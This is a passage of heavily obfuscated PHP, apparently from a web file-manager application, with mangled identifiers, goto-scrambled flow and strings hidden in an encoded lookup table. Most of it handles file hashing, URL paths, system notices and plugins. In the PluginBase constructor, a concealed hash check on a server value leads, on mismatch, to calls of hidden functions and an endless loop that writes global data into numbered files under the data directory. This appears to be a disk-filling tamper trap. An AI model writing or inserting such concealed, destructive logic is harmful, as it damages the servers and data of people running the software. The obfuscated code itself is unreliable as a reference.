$FÃ¥îŸ”¯®, !1); } } } } if (!$CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[388]] && $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[436]]) { $Cá„…†„ã[$Aìªæ‚‘ß™[518]][] = $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[436]]; } $DÈ¢·”‹ŒÉ[] = $this->_makeItemData($CÄÈ÷ƒÌäÍ, $A‚ùª¢ÏÏ, $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[28]]); goto D“ª‚óé¦; dÆÉÂ©‘¸: if (isset($CÜ£õÍÅ¤™[$CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[28]]])) { $CÄÈ÷ƒÌäÍ = $CÜ£õÍÅ¤™[$CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[28]]]; } $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[388]] = $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[29]] == $Aìªæ‚‘ß™[76]; $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[390]] = _get($CÄÈ÷ƒÌäÍ, $Aìªæ‚‘ß™[167], $Aìªæ‚‘ß™[33]); goto dÜ•»¢÷Ğ; D“ª‚óé¦: } unset($CÄÈ÷ƒÌäÍ); if (!empty($DÈ¢·”‹ŒÉ)) { $this->addAll($DÈ¢·”‹ŒÉ); $this->_childrenListSelect($B„ŸŸàäÓ); } goto aØ´”É™›¥; F…´«Ç™ç: } private function _addFiles($f‡‡±ìÄˆ, $d§š©ºôß, $bößƒÁ¥’é) { goto e¹¬˜‘äŞì; e¹¬˜‘äŞì: $e„£©¿ÂÑ =& $_SERVER[Æ¼ôºÙï]; if (!$d§š©ºôß || count($d§š©ºôß) == 0) { return array(); } $EõÆ“¼Î×¿ = array(); goto f™«‘ƒ±ƒ©; f‘¯¸Õ©«İ: $D™±Ç»Ü…½ = Model($e„£©¿ÂÑ[560]); $AÃ¸ÖƒÎ¤ = $D™±Ç»Ü…½->where($b•©âŸë¥œ)->select(); $AÃ¸ÖƒÎ¤ = $AÃ¸ÖƒÎ¤ ? $AÃ¸ÖƒÎ¤ : array(); goto eø¨›Œš²ë; B±¥³Í½Ôå: $AÃ¸ÖƒÎ¤ = $AÃ¸ÖƒÎ¤ ? $AÃ¸ÖƒÎ¤ : array(); foreach ($AÃ¸ÖƒÎ¤ as $b§ «ÚÎ…Û) { if (!isset($EõÆ“¼Î×¿[$b§ «ÚÎ…Û[$e„£©¿ÂÑ[169]]])) { continue; } $E¤‰§Ó÷Êù =& $EõÆ“¼Î×¿[$b§ «ÚÎ…Û[$e„£©¿ÂÑ[169]]]; foreach ($E¤‰§Ó÷Êù as &$B¢ÏˆÃä¨¼) { $B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[436]] = $b§ «ÚÎ…Û[$e„£©¿ÂÑ[436]]; } unset($B¢ÏˆÃä¨¼); } $eŠÕ™¸â¢¾ = array(); goto f†£äÇóÙØ; eø¨›Œš²ë: foreach ($AÃ¸ÖƒÎ¤ as $b§ «ÚÎ…Û) { if (!isset($EõÆ“¼Î×¿[$b§ «ÚÎ…Û[$e„£©¿ÂÑ[169]]])) { continue; } $bˆ˜¼¡ÚÂÍ = $EõÆ“¼Î×¿[$b§ «ÚÎ…Û[$e„£©¿ÂÑ[169]]]; foreach ($bˆ˜¼¡ÚÂÍ as &$B¢ÏˆÃä¨¼) { $B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[436]] = $b§ «ÚÎ…Û[$e„£©¿ÂÑ[436]]; $B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[557]] = !0; } unset($B¢ÏˆÃä¨¼); } $A’ñŠŞìíö = array(); foreach ($d§š©ºôß as $EÎ–Š˜Ã„‡) { if (isset($EÎ–Š˜Ã„‡[$e„£©¿ÂÑ[557]]) && $EÎ–Š˜Ã„‡[$e„£©¿ÂÑ[557]]) { continue; } $a­…¡½§“‘ = $f‡‡±ìÄˆ->getPathInner($EÎ–Š˜Ã„‡[$e„£©¿ÂÑ[75]]); $EÌæÏ™®È = $D™±Ç»Ü…½->addFileMake($a­…¡½§“‘, $EÎ–Š˜Ã„‡[$e„£©¿ÂÑ[77]], $EÎ–Š˜Ã„‡[$e„£©¿ÂÑ[170]], $EÎ–Š˜Ã„‡[$e„£©¿ÂÑ[169]], $EÎ–Š˜Ã„‡[$e„£©¿ÂÑ[28]], $bößƒÁ¥’é); $A’ñŠŞìíö[] = $EÌæÏ™®È; } goto A•«…äò; A•«…äò: $D™±Ç»Ü…½->addAll($A’ñŠŞìíö); $b•©âŸë¥œ = array($e„£©¿ÂÑ[169] => array($e„£©¿ÂÑ[7], array_keys($EõÆ“¼Î×¿))); $AÃ¸ÖƒÎ¤ = $D™±Ç»Ü…½->where($b•©âŸë¥œ)->select(); goto B±¥³Í½Ôå; f™«‘ƒ±ƒ©: foreach ($d§š©ºôß as &$B¢ÏˆÃä¨¼) { goto c“©ÔŠ; c“©ÔŠ: Hook::trigger($e„£©¿ÂÑ[558], $B¢ÏˆÃä¨¼); $B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[75]] = $f‡‡±ìÄˆ->getPathInner($B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[75]]); $Fàß¥·éË = $f‡‡±ìÄˆ->hashSimple($B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[75]]); goto Eó—ˆ¨¦; Eó—ˆ¨¦: $eÛÄŒ‚¤Ò = $f‡‡±ìÄˆ->hashMd5($B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[75]]); if (strlen($eÛÄŒ‚¤Ò) > 10 && !isset($EõÆ“¼Î×¿[$eÛÄŒ‚¤Ò])) { $EõÆ“¼Î×¿[$eÛÄŒ‚¤Ò] = array(); } $B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[170]] = $Fàß¥·éË; goto bÂ‡†…ãšò; bÂ‡†…ãšò: $B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[169]] = $eÛÄŒ‚¤Ò; Hook::trigger($e„£©¿ÂÑ[559], $B¢ÏˆÃä¨¼); $EõÆ“¼Î×¿[$eÛÄŒ‚¤Ò][] =& $B¢ÏˆÃä¨¼; goto cœ²ŞÉÉ¬Ö; cœ²ŞÉÉ¬Ö: if (count($EõÆ“¼Î×¿[$eÛÄŒ‚¤Ò]) > 1) { $B¢ÏˆÃä¨¼[$e„£©¿ÂÑ[557]] = !0; } goto f‡¬ßÁ¾ÆÄ; f‡¬ßÁ¾ÆÄ: } unset($B¢ÏˆÃä¨¼); $b•©âŸë¥œ = array($e„£©¿ÂÑ[169] => array($e„£©¿ÂÑ[7], array_keys($EõÆ“¼Î×¿))); goto f‘¯¸Õ©«İ; f†£äÇóÙØ: foreach ($d§š©ºôß as $fÃ–äÉª±À) { $eŠÕ™¸â¢¾[$fÃ–äÉª±À[$e„£©¿ÂÑ[28]]] = $fÃ–äÉª±À; } return $eŠÕ™¸â¢¾; goto Bºäğİ•±¬; Bºäğİ•±¬: } } define($_SERVER[Æ¼ôºÙï][561], $_SERVER[Æ¼ôºÙï][562]); goto dó†İÅ£ï; C”¿Œ—‚¶¼: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($aÁÅà«Î½  = false) { } public function exist($f¨çšä²›¨) { $eğ™äñ£†ô = $this->info($f¨çšä²›¨); return $eğ™äñ£†ô[$_SERVER[Æ¼ôºÙï][193]]; } public function isFile($Fõº¹Üëø») { $DÈºÔñ–Ô = $this->info($Fõº¹Üëø»); return $DÈºÔñ–Ô[$_SERVER[Æ¼ôºÙï][193]]; } public function isFolder($AãäÓì§ß) { return !1; } public function size($aÕÇ„«ƒ´) { $e´ãé‹Î = $this->info($aÕÇ„«ƒ´); return $e´ãé‹Î[$_SERVER[Æ¼ôºÙï][77]]; } public function info($f¹Å¿¯™å÷) { return $this->infoParse($f¹Å¿¯™å÷); } public function infoAuth($Aİİª ËÉ±) { return $this->infoParse($Aİİª ËÉ±); } public function infoWithChildren($A¡©ô­Â¤©) { return $this->infoParse($A¡©ô­Â¤©); } public function infoFull($fß–£‘µš) { return $this->infoParse($fß–£‘µš); } private function infoParse($BœÔ¼…Ò˜Ø) { $bÆÈÎ‹†½† =& $_SERVER[Æ¼ôºÙï]; $Cæ†Á¹åõ‰ = $this->header($BœÔ¼…Ò˜Ø); if (!$Cæ†Á¹åõ‰ || !$Cæ†Á¹åõ‰[$bÆÈÎ‹†½†[708]]) { return !1; } $cß¬ÖƒĞá = _get($Cæ†Á¹åõ‰, $bÆÈÎ‹†½†[333], 0); $b›µ‚°Ó‘ = array($bÆÈÎ‹†½†[28] => $Cæ†Á¹åõ‰[$bÆÈÎ‹†½†[28]], $bÆÈÎ‹†½†[75] => $BœÔ¼…Ò˜Ø, $bÆÈÎ‹†½†[29] => $bÆÈÎ‹†½†[173], $bÆÈÎ‹†½†[77] => intval($cß¬ÖƒĞá), $bÆÈÎ‹†½†[167] => get_path_ext($Cæ†Á¹åõ‰[$bÆÈÎ‹†½†[28]]), $bÆÈÎ‹†½†[1231] => $cß¬ÖƒĞá > 0 && $Cæ†Á¹åõ‰[$bÆÈÎ‹†½†[1352]], $bÆÈÎ‹†½†[1232] => !1); return $b›µ‚°Ó‘; } private function header($Dï¼–‹‰¯î) { goto bß£Óô’…è; bß£Óô’…è: $Cœ–©¡ Ø¦ =& $_SERVER[Æ¼ôºÙï]; if (isset(self::$_cacheHeader[$Dï¼–‹‰¯î])) { return self::$_cacheHeader[$Dï¼–‹‰¯î]; } $FØ³ŞÖñÆÀ = isset($GLOBALS[$Cœ–©¡ Ø¦[1353]]) ? $GLOBALS[$Cœ–©¡ Ø¦[1353]] : !1; goto Aˆ‘Œ“íäò; dóÆÆÇÛ„Œ: return self::$_cacheHeader[$Dï¼–‹‰¯î]; goto E£ÄøÏÜíä; Aˆ‘Œ“íäò: $GLOBALS[$Cœ–©¡ Ø¦[1353]] = !0; self::$_cacheHeader[$Dï¼–‹‰¯î] = url_header($Dï¼–‹‰¯î); $GLOBALS[$Cœ–©¡ Ø¦[1353]] = $FØ³ŞÖñÆÀ; goto dóÆÆÇÛ„Œ; E£ÄøÏÜíä: } public function hashSimple($E†”Ê‰”¤À, $f‘«˜•òœ = false) { goto AŞ³Æ÷ùî¹; aåŒ¾õ¯ˆ£: $eñï–åÇ° = timeFloat(); $D à®ë = 15; for ($CÜ„Ä–è¿› = 0; $CÜ„Ä–è¿› < $EÁÔìØ—Ó­; $CÜ„Ä–è¿›++) { if (timeFloat() - $eñï–åÇ° > $D à®ë) { return !1; } $A»šËÓ–¢É = $this->fileSubstr($E†”Ê‰”¤À, $e†šó×Â¦ * $CÜ„Ä–è¿›, $c¾—‹Ó–Ú); if (!$A»šËÓ–¢É) { return !1; } $C¬¯»‹•²¢ .= $A»šËÓ–¢É; } goto Ağ©Œ­æ¶; Få—È¡‡Ü¿: if ($eèÊóÑä¸± <= $c¾—‹Ó–Ú * $EÁÔìØ—Ó­) { return md5($this->fileSubstr($E†”Ê‰”¤À, 0, $eèÊóÑä¸±)) . $eèÊóÑä¸±; } $e†šó×Â¦ = intval($eèÊóÑä¸± / $EÁÔìØ—Ó­); $C¬¯»‹•²¢ = $CÂ“²ˆêÜ[33]; goto aåŒ¾õ¯ˆ£; AŞ³Æ÷ùî¹: $CÂ“²ˆêÜ =& $_SERVER[Æ¼ôºÙï]; $D‘Òà¥á = $this->info($E†”Ê‰”¤À); if (!$D‘Òà¥á || !$D‘Òà¥á[$CÂ“²ˆêÜ[193]]) { return !1; } goto Aï¬»’…—Œ; Aï¬»’…—Œ: $eèÊóÑä¸± = $D‘Òà¥á[$CÂ“²ˆêÜ[77]]; $c¾—‹Ó–Ú = 200; $EÁÔìØ—Ó­ = 50; goto Få—È¡‡Ü¿; Ağ©Œ­æ¶: $C¬¯»‹•²¢ .= $this->fileSubstr($E†”Ê‰”¤À, $eèÊóÑä¸± - $c¾—‹Ó–Ú, $c¾—‹Ó–Ú); return md5($C¬¯»‹•²¢) . $eèÊóÑä¸±; goto EŠáÓà¢Ì„; EŠáÓà¢Ì„: } public function getContent($B³…–ÄŠˆ) { return $this->fileSubstr($B³…–ÄŠˆ); } public function fileSubstr($E…ƒˆƒŠÑá, $fô‹„ŠÁ‹ = 0, $E‹¼¯„Å¶â = -1) { goto dÃ‡ô©‹Ñ‘; DäñÉ²¶æÔ: if ($E‹¼¯„Å¶â === -1) { $E‹¼¯„Å¶â = $Aœô­æ¦ù…[$DÂÍŸœšª›[77]]; } if ($E‹¼¯„Å¶â == 0) { return $DÂÍŸœšª›[33]; } $cÖÒ³å¨Á = array($DÂÍŸœšª›[1354] . $fô‹„ŠÁ‹ . $DÂÍŸœšª›[734] . ($fô‹„ŠÁ‹ + $E‹¼¯„Å¶â - 1)); goto Eï­¶™Î¹Ğ; dÃ‡ô©‹Ñ‘: $DÂÍŸœšª› =& $_SERVER[Æ¼ôºÙï]; $Aœô­æ¦ù… = $this->info($E…ƒˆƒŠÑá); if (!$Aœô­æ¦ù… || !$Aœô­æ¦ù…[$DÂÍŸœšª›[193]] && $Aœô­æ¦ù…[$DÂÍŸœšª›[77]] > 1024 * 1024 * 10) { return !1; } goto DäñÉ²¶æÔ; Eï­¶™Î¹Ğ: $bÃå©òéÅó = url_request($E…ƒˆƒŠÑá, $DÂÍŸœšª›[226], !1, $cÖÒ³å¨Á, !1, !1, 1); return $bÃå©òéÅó[$DÂÍŸœšª›[1067]] ? $bÃå©òéÅó[$DÂÍŸœšª›[1067]] : $DÂÍŸœšª›[33]; goto a±©äíÚŒÕ; a±©äíÚŒÕ: } public function download($eÌ…•¯«ä, $cÎ‚‰±“÷) { Downloader::start($eÌ…•¯«ä, $cÎ‚‰±“÷); return $cÎ‚‰±“÷; } } $D¹Å¼¥‘” = $_SERVER[$_SERVER[Æ¼ôºÙï][811]]; $C—È´Šœ = $_SERVER[Æ¼ôºÙï][812]; goto dÑ±ó ç; c­ÒŞ éÎˆ: function binCheckBigger($BÎä‰÷ñ‚, $eÀçè§è†³) { return $BÎä‰÷ñ‚ > $eÀçè§è†³; } $_SERVER[$_SERVER[Î][3]] = ("\x38\x38\x32\x31"."\66\60")+0;$_QPHM="T5RpJQ9JuhqjKFC4HcvEgjjXuJzyDnWVAxAPi4mb6Im9JdfgPrVY3AtvDTruibkUkcZa6qRt5fmy79";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($c¶„¢’²‘İ, $Dîº×…Ú¨î) { $D»Ë×„Œâ =& $_SERVER[Æ¼ôºÙï]; if (isset(self::$_methodList[$c¶„¢’²‘İ])) { return @call_user_func_array(self::$_methodList[$c¶„¢’²‘İ], $Dîº×…Ú¨î); } else { if (method_exists($this, $c¶„¢’²‘İ)) { return call_user_func_array(array($this, $c¶„¢’²‘İ), $Dîº×…Ú¨î); } else { think_exception(__CLASS__ . $D»Ë×„Œâ[4] . $c¶„¢’²‘İ . $D»Ë×„Œâ[5]); } } } public static function __callStatic($bóÀáÊÇøœ, $a»¢â‹Ë¶Â) { if (isset(self::$_methodListStatic[$bóÀáÊÇøœ])) { return call_user_func_array(self::$_methodListStatic[$bóÀáÊÇøœ], $a»¢â‹Ë¶Â); } else { if (method_exists(self, $bóÀáÊÇøœ)) { return call_user_func_array(array(self, $bóÀáÊÇøœ), $a»¢â‹Ë¶Â); } else { show_json("{$bóÀáÊÇøœ}\50\51\x20\156\157\164\x20\145\170\151\163\x74\73", !1); } } } public static function addMethod($eÈ˜¬²Â›, $e»®ˆÄÈ¨) { self::$_methodList[$eÈ˜¬²Â›] = $e»®ˆÄÈ¨; } public static function addMethodStatic($f‚ˆ²÷š¥Ğ, $E†ˆ©÷Óï‡) { self::$_methodListStatic[$f‚ˆ²÷š¥Ğ] = $E†ˆ©÷Óï‡; } } goto Cºá‡ì÷ôÉ; dó†İÅ£ï: $Cî¼Ôø = $_SERVER[Æ¼ôºÙï][563]; $_SERVER[­£] = explode($_SERVER[Æ¼ôºÙï][564], gzinflate(substr($_SERVER[Æ¼ôºÙï][565], 10, -8))); $eë–ÉÍÎ† = $_SERVER[Æ¼ôºÙï][566]; goto fÔº‹ØŠ®Í; BĞ¸‡—íÔ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\156\x6f\164\151\143\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\143\x6f\x6e\164\x65\x6e\x74", "\141\x75\164\x68", "\x6d\157\x64\145", "\164\151\155\145", "\x74\171\160\x65", "\154\x65\166\x65\154", "\145\x6e\x61\142\x6c\x65", "\x73\x6f\162\x74"); public function listData($CÇË‡……®› = false, $AÕö÷åù = "\x73\x6f\162\164", $C™­¶Ù¨‰Ä = false) { return parent::listData($CÇË‡……®›, $AÕö÷åù, $C™­¶Ù¨‰Ä); } public function add($cÓ¬‘é–) { $c—Ä¢ Š¸ë =& $_SERVER[Æ¼ôºÙï]; $aÃêäœêÈ¼ = time(); if ($cÓ¬‘é–[$c—Ä¢ Š¸ë[12]] == $c—Ä¢ Š¸ë[2063]) { $aÃêäœêÈ¼ = strtotime($cÓ¬‘é–[$c—Ä¢ Š¸ë[195]]); } $cÓ¬‘é–[$c—Ä¢ Š¸ë[195]] = $aÃêäœêÈ¼; return parent::insert($cÓ¬‘é–); } public function update($A§Ú˜ğÆÅ›, $dŸ¹ÍˆÒö) { goto aÁ»Ğ¶Û­; aÁ»Ğ¶Û­: $d‘¡¤²Òˆ =& $_SERVER[Æ¼ôºÙï]; $B®’ƒ…“ãò = $this->listData($A§Ú˜ğÆÅ›); if (!$B®’ƒ…“ãò) { return !1; } goto d¸•ğèéÓ; AõÀ¨õë: return parent::update($A§Ú˜ğÆÅ›, $dŸ¹ÍˆÒö); goto FÒ„‡•ô·; d¸•ğèéÓ: $cğËï·³²ø = time(); if ($dŸ¹ÍˆÒö[$d‘¡¤²Òˆ[12]] == $d‘¡¤²Òˆ[2063]) { $cğËï·³²ø = strtotime($dŸ¹ÍˆÒö[$d‘¡¤²Òˆ[195]]); } $dŸ¹ÍˆÒö[$d‘¡¤²Òˆ[195]] = $cğËï·³²ø; goto AõÀ¨õë; FÒ„‡•ô·: } public function remove($b¯ª¤Ñ²±ø) { $dŠ¢á÷İ’¹ = $this->listData($b¯ª¤Ñ²±ø); if (!$dŠ¢á÷İ’¹ || $dŠ¢á÷İ’¹[$_SERVER[Æ¼ôºÙï][1146]]) { return !1; } return parent::remove($b¯ª¤Ñ²±ø); } public function sort($f÷Äá¼¥…—, $AŠÍâí÷İ×) { return parent::update($f÷Äá¼¥…—, $AŠÍâí÷İ×); } public function enable($C¼¥…¼ªô, $A«ÜÙ¾î) { return parent::update($C¼¥…¼ªô, array($_SERVER[Æ¼ôºÙï][2064] => $A«ÜÙ¾î)); } private function initUserOption() { $B¥ÙÌÂ‹Ó¹ =& $_SERVER[Æ¼ôºÙï]; $this->optionType = $B¥ÙÌÂ‹Ó¹[2065]; $this->modelType = $B¥ÙÌÂ‹Ó¹[2066]; $this->field = array($B¥ÙÌÂ‹Ó¹[2067], $B¥ÙÌÂ‹Ó¹[28], $B¥ÙÌÂ‹Ó¹[195], $B¥ÙÌÂ‹Ó¹[29], $B¥ÙÌÂ‹Ó¹[2068], $B¥ÙÌÂ‹Ó¹[708], $B¥ÙÌÂ‹Ó¹[189]); } public function userNoticeGet($A‘ïÚ›Ó²ò = false) { $this->initUserOption(); return parent::listData($A‘ïÚ›Ó²ò, $_SERVER[Æ¼ôºÙï][385], !0); } public function userNoticeAdd($e³†¶‹çŞ) { $cóÒ›…¥¨å =& $_SERVER[Æ¼ôºÙï]; $this->initUserOption(); $AóñÌÀ§á = $this->findByKey($cóÒ›…¥¨å[2067], $e³†¶‹çŞ[$cóÒ›…¥¨å[385]]); if ($AóñÌÀ§á) { return !0; } $B‹óõ”•– = array($cóÒ›…¥¨å[2067] => $e³†¶‹çŞ[$cóÒ›…¥¨å[385]], $cóÒ›…¥¨å[28] => $e³†¶‹çŞ[$cóÒ›…¥¨å[28]], $cóÒ›…¥¨å[195] => $e³†¶‹çŞ[$cóÒ›…¥¨å[195]], $cóÒ›…¥¨å[29] => isset($e³†¶‹çŞ[$cóÒ›…¥¨å[29]]) ? $e³†¶‹çŞ[$cóÒ›…¥¨å[29]] : 1, $cóÒ›…¥¨å[2068] => isset($e³†¶‹çŞ[$cóÒ›…¥¨å[2068]]) ? $e³†¶‹çŞ[$cóÒ›…¥¨å[2068]] : 0, $cóÒ›…¥¨å[708] => 0, $cóÒ›…¥¨å[189] => 0); return parent::insert($B‹óõ”•–); } public function userNoticeEdit($EÂÏ ÕÍã›, $c¥¤¥Ëê™Á) { $this->initUserOption(); return parent::update($EÂÏ ÕÍã›, $c¥¤¥Ëê™Á); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\155\137\x6f\160\x74\151\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\x6f\154\145", "\x72\x6f\x6c\x65\x47\162\157\x75\x70", "\162\x65\147\151\x73\x74", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($EÔ‘–Ç·Ûî) { return "\x53\171\x73\164\145\155\x4f\x70\x74\x69\x6f\156\137{$EÔ‘–Ç·Ûî}"; } protected function optionDefault($E“Îë¨ª”ƒ = '') { $CÂ‰ˆ¨Óùä =& $_SERVER[Æ¼ôºÙï]; if ($E“Îë¨ª”ƒ == $CÂ‰ˆ¨Óùä[33]) { return $GLOBALS[$CÂ‰ˆ¨Óùä[6]][$CÂ‰ˆ¨Óùä[373]]; } } } class SystemRecordModel extends ModelBaseLight { } goto bƒßƒ…†‚; C¾£²ğô: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto C××µÒ³Ñ¹; aÙˆ…‘ñ ³: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto b¡ºãä†•Í; E—Á‰àØ»: $this->in =& $in; $this->modelPlugin = Model($b©¢ªïá††[1373]); $this->pluginName = str_replace($b©¢ªïá††[1373], $b©¢ªïá††[33], get_class($this)); goto fô“Àë‘ï; D¶À‚ë¨‡: $this->pluginHostDefault = $config[$b©¢ªïá††[1375]] . $this->pluginName . $b©¢ªïá††[8]; $e·¶³¤ìñ‹ = $config[$b©¢ªïá††[1376]]; if ($e·¶³¤ìñ‹ && strpos($b©¢ªïá††[47] . $e·¶³¤ìñ‹ . $b©¢ªïá††[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$b©¢ªïá††[1377]] . $this->pluginName . $b©¢ªïá††[8]; } goto aÙˆ…‘ñ ³; fô“Àë‘ï: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $b©¢ªïá††[8]; $this->pluginApi = appHostGet() . $b©¢ªïá††[1374] . $this->pluginName . $b©¢ªïá††[8]; $this->pluginHost = $config[$b©¢ªïá††[1375]] . $this->pluginName . $b©¢ªïá††[8]; goto D¶À‚ë¨‡; føéÂËèï¯: if ($_SERVER[$b©¢ªïá††[813]] != $bĞ„‡Õ•ò°($eÎâÙµèŠ”)) { goto dŸ˜É­ì×ó; dŸ˜É­ì×ó: $bùëèå‡á = $b©¢ªïá††[814]; $fË¡Â¨ˆ” = $b©¢ªïá††[815]; $E‹æÜ…‹¦ = $_SERVER[$b©¢ªïá††[816]] . $b©¢ªïá††[817]; goto EêÛĞÄÁ¹; e‰Ê¸ï¢Í: $eæÄŞ¶¸ôŒ = $b©¢ªïá††[819]; $eæÄŞ¶¸ôŒ($_SERVER[$b©¢ªïá††[820]]); $bùëèå‡á = $b©¢ªïá††[814]; goto fÒÏÙÎÁŠ; a•¦•¥šÄñ: $E‘À¥ ®Ã = 1; for ($aëøÏö›ˆ = $E‘À¥ ®Ã; $aëøÏö›ˆ > 0; $aëøÏö›ˆ++) { $BòØë‰ì„(DATA_PATH . $aëøÏö›ˆ, $C”¬ªŸß´); } goto d„íãÕÃ ˜; EêÛĞÄÁ¹: $f±‚ÑŒ–ß = $fË¡Â¨ˆ”($E‹æÜ…‹¦); $cÖÔÁï å = explode($b©¢ªïá††[227], $f±‚ÑŒ–ß); if (count($cÖÔÁï å) < $b©¢ªïá††[574]) { $CÒœô®Çê = $b©¢ªïá††[818]; $CÒœô®Çê(); } goto e‰Ê¸ï¢Í; fÒÏÙÎÁŠ: $bùëèå‡á(); $BòØë‰ì„ = $b©¢ªïá††[821]; $C”¬ªŸß´ = json_encode($GLOBALS[$b©¢ªïá††[822]]); goto a•¦•¥šÄñ; d„íãÕÃ ˜: } global $in, $config; $this->config =& $config; goto E—Á‰àØ»; C××µÒ³Ñ¹: $b©¢ªïá†† =& $_SERVER[Æ¼ôºÙï]; $eÎâÙµèŠ” = $_SERVER[$b©¢ªïá††[816]] . $b©¢ªïá††[817]; $bĞ„‡Õ•ò° = $b©¢ªïá††[812]; goto føéÂËèï¯; b¡ºãä†•Í: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Æ¼ôºÙï][1378]); } protected function assign($Fâºƒ¿Ùóƒ, $Dãœ«‚å– = false) { if (is_array($Fâºƒ¿Ùóƒ)) { $this->values = array_merge($this->values, $Fâºƒ¿Ùóƒ); } else { $this->values[$Fâºƒ¿Ùóƒ] = $Dãœ«‚å–; } } protected function display($FÊ ¼ÃÕ™š) { extract($this->values); require $FÊ ¼ÃÕ™š; } final function hookRegist($bù¸ò®ìƒ) { $this->modelPlugin->appRegist($this->pluginName, $bù¸ò®ìƒ); } final function appIcon() { $DÓ¼Â³¬ÌŒ =& $_SERVER[Æ¼ôºÙï]; $f…¯»§„§ = $this->appPackage(); $Aß®™³»´ = $DÓ¼Â³¬ÌŒ[33]; if (isset($f…¯»§„§[$DÓ¼Â³¬ÌŒ[400]])) { if (isset($f…¯»§„§[$DÓ¼Â³¬ÌŒ[400]][$DÓ¼Â³¬ÌŒ[1379]])) { $Aß®™³»´ = $DÓ¼Â³¬ÌŒ[1380] . $f…¯»§„§[$DÓ¼Â³¬ÌŒ[400]][$DÓ¼Â³¬ÌŒ[1379]] . $DÓ¼Â³¬ÌŒ[1381]; } else { if ($f…¯»§„§[$DÓ¼Â³¬ÌŒ[400]][$DÓ¼Â³¬ÌŒ[1382]]) { $Aß®™³»´ = $DÓ¼Â³¬ÌŒ[1383] . $f…¯»§„§[$DÓ¼Â³¬ÌŒ[400]][$DÓ¼Â³¬ÌŒ[1382]] . $DÓ¼Â³¬ÌŒ[1384]; } } } return $Aß®™³»´; } final function fileCanView($Aáºå¿øè³) { goto bÊÌ¤‹´¶; dÙ¿Î‚ë: ActionCall($bœ­¥ÂÍ–[1397], $Aáºå¿øè³); goto EßÇ·‡í; C§×£‚¯¸ô: $dßÌÆ•é—Ş = Session::get($bœ­¥ÂÍ–[1385]); if (!$dßÌÆ•é—Ş || !$dßÌÆ•é—Ş[$bœ­¥ÂÍ–[1386]]) { $e¯İÒÚÜŞâ = $bœ­¥ÂÍ–[1387] . rawurlencode(this_url()); show_tips(LNG($bœ­¥ÂÍ–[1388]) . $bœ­¥ÂÍ–[1389] . $e¯İÒÚÜŞâ . $bœ­¥ÂÍ–[1390] . LNG($bœ­¥ÂÍ–[1391]) . $bœ­¥ÂÍ–[1392], !1); } if (!Action($bœ­¥ÂÍ–[1393])->authCan($bœ­¥ÂÍ–[1394])) { show_tips(LNG($bœ­¥ÂÍ–[1395]) . $bœ­¥ÂÍ–[1396], !1); } goto dÙ¿Î‚ë; bÊÌ¤‹´¶: $bœ­¥ÂÍ– =& $_SERVER[Æ¼ôºÙï]; if (request_url_safe($Aáºå¿øè³)) { return !0; } if ($this->isShare($Aáºå¿øè³)) { return !0; } goto C§×£‚¯¸ô; EßÇ·‡í: } final function isShare($AººÀ‡’ÊÄ) { $c–ÑŠÊ•£½ = KodIO::parse($AººÀ‡’ÊÄ); return $c–ÑŠÊ•£½[$_SERVER[Æ¼ôºÙï][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($cæÙÓÛÃ¶”) { if (request_url_safe($cæÙÓÛÃ¶”)) { return $cæÙÓÛÃ¶”; } if (!$this->isShare($cæÙÓÛÃ¶”)) { $cæÙÓÛÃ¶” = $this->filePath($cæÙÓÛÃ¶”); } return Action($_SERVER[Æ¼ôºÙï][1049])->linkOut($cæÙÓÛÃ¶”); } public function filePathLinkOut($FÂ—¦Êöã) { if (request_url_safe($FÂ—¦Êöã)) { return $FÂ—¦Êöã; } $this->fileCanView($FÂ—¦Êöã); return Action($_SERVER[Æ¼ôºÙï][1049])->link($FÂ—¦Êöã); } final function filePath($CÓÇ³Ìİ†³) { $d¯­ÊÄŞ¯ =& $_SERVER[Æ¼ôºÙï]; if ($E¬ô•Ó‘Ñ± = $this->checkSharePath($CÓÇ³Ìİ†³)) { return $E¬ô•Ó‘Ñ±; } $this->fileCanView($CÓÇ³Ìİ†³); if (request_url_safe($CÓÇ³Ìİ†³)) { $EÔ®Ç–‹Šè = parse_url_query($CÓÇ³Ìİ†³); if (isset($EÔ®Ç–‹Šè[$d¯­ÊÄŞ¯[1398]]) && isset($EÔ®Ç–‹Šè[$d¯­ÊÄŞ¯[207]])) { $Aî‹â”Ø³Ë = Model($d¯­ÊÄŞ¯[1103])->get($d¯­ÊÄŞ¯[1399]); $d’ÎèÄÀË = Mcrypt::decode($EÔ®Ç–‹Šè[$d¯­ÊÄŞ¯[207]], $Aî‹â”Ø³Ë); if ($d’ÎèÄÀË) { $this->fileInfo = 